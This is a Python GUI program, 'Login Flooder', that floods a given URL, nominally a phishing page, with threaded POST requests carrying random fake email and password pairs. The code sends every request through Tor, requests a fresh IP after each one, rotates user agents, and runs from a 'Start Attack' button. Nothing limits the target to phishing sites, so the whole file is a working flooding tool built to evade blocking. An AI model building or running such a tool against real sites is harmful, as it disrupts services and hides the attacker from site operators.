import requests
import threading
import random
import string
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
from PIL import ImageTk, Image
from stem import Signal
from stem.control import Controller

# ========== Tor Setup ========== #
TOR_PASSWORD = "your_password"  # ← Change the password here after setting up torrc
TOR_PROXY = 'socks5h://127.0.0.1:9050'

# ========== Status ========== #
is_running = False
success_count = 0
fail_count = 0

# User-Agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B)...",
]

def change_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=TOR_PASSWORD)
            controller.signal(Signal.NEWNYM)
    except Exception as e:
        pass  # Do not stop the program if IP change fails

def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return {"email": username + "@gmail.com", "pass": password}

def send_request(url, log_widget, success_label, fail_label, use_tor_var):
    global success_count, fail_count
    if not is_running:
        return

    data = generate_random_credentials()
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": url
    }
    proxies = {"http": TOR_PROXY, "https": TOR_PROXY} if use_tor_var.get() else None

    try:
        response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=15)
        success_count += 1
        status = f"[✓] {data} → {response.status_code}"
        if use_tor_var.get():
            change_tor_ip()
    except Exception as e:
        fail_count += 1
        status = f"[×] {data} → {e}"

    log_widget.after(0, lambda: log_widget.insert(tk.END, status + "\n"))
    log_widget.after(0, log_widget.yview_moveto, 1.0)
    success_label.config(text=f"✓ Success: {success_count}")
    fail_label.config(text=f"× Failed: {fail_count}")

    time.sleep(random.uniform(0.7, 2.0))

def start_attack():
    global is_running, success_count, fail_count
    is_running = True
    success_count = 0
    fail_count = 0

    url = url_entry.get()
    try:
        count = int(count_entry.get())
    except ValueError:
        messagebox.showerror("Error", "Please enter an integer.")
        return

    if not url.startswith("http"):
        messagebox.showerror("Error", "URL must start with http.")
        return

    log_area.delete("1.0", tk.END)

    def run():
        for _ in range(count):
            if not is_running:
                break
            threading.Thread(
                target=send_request,
                args=(url, log_area, success_label, fail_label, use_tor)
            ).start()
            time.sleep(0.1)

    threading.Thread(target=run).start()

def stop_attack():
    global is_running
    is_running = False
    messagebox.showinfo("Stop", "Process stopped.")

# ========== User Interface ========== #
app = tk.Tk()
app.title("Login Flooder by Sami.Khatatba")
app.geometry("600x680")
app.resizable(False, False)
app.configure(bg="#1e1e1e")

# Banner
banner_image = Image.open("sami_banner.png")
banner_photo = ImageTk.PhotoImage(banner_image)
banner_label = tk.Label(app, image=banner_photo, bg="#1e1e1e")
banner_label.pack()

tk.Label(app, text="Phishing Page URL:", bg="#1e1e1e", fg="white").pack()
url_entry = tk.Entry(app, width=70)
url_entry.pack()

tk.Label(app, text="Number of Requests:", bg="#1e1e1e", fg="white").pack(pady=4)
count_entry = tk.Entry(app, width=20)
count_entry.pack()

# Tor checkbox
use_tor = tk.BooleanVar(value=True)
tk.Checkbutton(app, text="Use Tor to change IP", variable=use_tor, bg="#1e1e1e", fg="white", selectcolor="#1e1e1e").pack(pady=5)

tk.Button(app, text="Start Attack", command=start_attack, bg="#28a745", fg="white").pack(pady=6)
tk.Button(app, text="Stop", command=stop_attack, bg="#dc3545", fg="white").pack()

success_label = tk.Label(app, text="✓ Success: 0", fg="lime", bg="#1e1e1e", font=("Courier", 10))
success_label.pack(pady=2)
fail_label = tk.Label(app, text="× Failed: 0", fg="red", bg="#1e1e1e", font=("Courier", 10))
fail_label.pack()

tk.Label(app, text="Log:", bg="#1e1e1e", fg="white").pack()
log_area = scrolledtext.ScrolledText(app, width=72, height=20, bg="black", fg="lime", font=("Courier", 9))
log_area.pack(padx=10, pady=10)

app.mainloop()
